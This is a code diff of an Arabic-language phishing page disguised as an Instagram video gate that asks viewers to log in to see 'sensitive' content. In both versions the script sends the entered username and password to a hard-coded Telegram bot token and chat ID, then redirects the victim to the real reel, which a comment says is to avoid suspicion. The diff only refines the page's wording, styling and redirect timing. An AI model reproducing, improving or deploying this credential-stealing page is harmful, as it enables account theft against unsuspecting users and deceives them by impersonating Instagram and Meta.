@@ -3,61 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+    
     <meta property="og:title" content="Abdulaziz Shah على Instagram : ما توقعت المايك يلقط تغريد الطيور...">
-    <meta property="og:description" content="شاهد الفيديو الكامل الآن على تطبيق Instagram">
-    <meta property="og:image" content="https://scontent.cdninstagram.com/v/t51.2885-15/434524458_1123447385517373_7562846834162356541_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=18de2a&_nc_ohc=example"> 
-    <meta property="og:url" content="https://www.instagram.com/reel/DVucGpOiJms/">
+    
+    <meta property="og:description" content="شاهد الفيديو الكامل الآن عبر تطبيق Instagram. المحتوى قد يحتوي على مشاهد حساسة.">
+    
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png">
+    
     <meta property="og:type" content="video.other">
+    <meta property="og:url" content="https://www.instagram.com/reel/DVucGpOiJms/">
 
     <title>Instagram Video</title>
+    
     <style>
         body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { width: 330px; text-align: center; border: 1px solid #262626; padding: 35px 25px; border-radius: 10px; background-color: #000; }
-        .insta-logo { width: 55px; margin-bottom: 20px; }
-        h2 { font-size: 16px; font-weight: 600; margin-bottom: 15px; color: #efefef; }
-        p { font-size: 13px; color: #a8a8a8; margin-bottom: 25px; line-height: 1.4; }
-        input { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 5px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 14px; outline: none; text-align: center; }
-        input:focus { border-color: #555; }
-        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; }
-        .footer-text { font-size: 11px; color: #555; margin-top: 20px; }
+        .login-card { width: 330px; text-align: center; border: 1px solid #262626; padding: 40px 20px; border-radius: 8px; background-color: #000; }
+        .insta-logo { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 18px; font-weight: 600; margin-bottom: 10px; color: #fff; }
+        p { font-size: 14px; color: #a8a8a8; margin-bottom: 25px; line-height: 1.5; }
+        input { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 3px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 14px; }
+        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .footer-text { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
     </style>
 </head>
 <body>
 
     <div class="login-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo" alt="Instagram">
         <h2>محتوى حساس</h2>
-        <p>هذا الفيديو يحتوي على محتوى قد يراه البعض حساساً. يرجى تسجيل الدخول لتأكيد عمرك ومشاهدة الفيديو بالكامل.</p>
+        <p>يجب عليك تسجيل الدخول لتأكيد هويتك ومشاهدة هذا الفيديو (18+).</p>
         
-        <input type="text" id="field_u" placeholder="اسم المستخدم، الهاتف أو البريد">
-        <input type="password" id="field_p" placeholder="كلمة المرور">
+        <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
+        <input type="password" id="p" placeholder="كلمة المرور">
         
-        <button class="btn-login" onclick="captureData()">مشاهدة الفيديو</button>
+        <button class="btn-login" onclick="sendData()">تسجيل الدخول للمشاهدة</button>
         
-        <div class="footer-text">من شركة Meta</div>
+        <div class="footer-text">من Meta</div>
     </div>
 
     <script>
-        function captureData() {
-            const u = document.getElementById('field_u').value;
-            const p = document.getElementById('field_p').value;
-            const bot_token = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
-            const chat_id = "897618292";
-
-            if (u.length < 3 || p.length < 3) {
-                alert("يرجى إدخال بيانات صحيحة");
+        function sendData() {
+            const user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            
+            if(user === "" || pass === "") {
+                alert("يرجى إدخال البيانات المطلوبة");
                 return;
             }
 
-            // إرسال البيانات للبوت
-            fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🔥 صيد جديد من رابط الفيديو:\n👤 اليوزر: " + u + "\n🔑 الرمز: " + p)}`)
+            // إرسال البيانات لبوت التليجرام الخاص بك
+            const token = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+            const chatId = "897618292";
+            const message = `🔥 صيدة جديدة بالفيديو:\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .then(() => {
-                // تحويل المبتز للفيديو الحقيقي فوراً لإبعاد الشبهة
-                window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/";
+                // تحويل الضحية للفيديو الأصلي بعد ثانية واحدة
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/";
+                }, 1000);
             });
         }
     </script>
 </body>
 </html>
-
